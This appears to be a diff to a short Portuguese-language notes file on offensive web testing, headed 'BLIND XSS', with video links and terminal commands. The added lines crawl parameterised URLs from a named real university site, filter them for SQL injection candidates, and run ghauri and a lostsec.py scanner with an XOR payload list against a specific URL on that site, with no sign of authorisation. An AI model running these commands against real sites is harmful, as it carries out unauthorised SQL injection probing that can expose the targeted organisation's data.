@@ -1,5 +1,6 @@
 BLIND XSS
 https://www.youtube.com/watch?v=KhVMSTYgMxc&t=264s
+https://www.youtube.com/watch?v=x1z4GxDtEo0
 
 Comando terminal (POC):
 
@@ -11,3 +12,9 @@ Comando terminal (POC):
 
    Criar um arquivo poc.txt com a requisição, o conteúdo é o mesmo utilizado no BURP.
    ghauri -r poc.txt --batch --level 3
+
+Extrair URLS com parâmetro (=) de sites para serem utilizadas em chamadas GET (crawler)
+
+   echo https://cutm.ac.in | gau | urldedupe -qs | gf sqli | grep ?id=
+
+   python lostsec.py "https://cutm.ac.in/payu/skill/index.php?id=17" -p payloads/xor.txt -t 5 -o sqli.txt
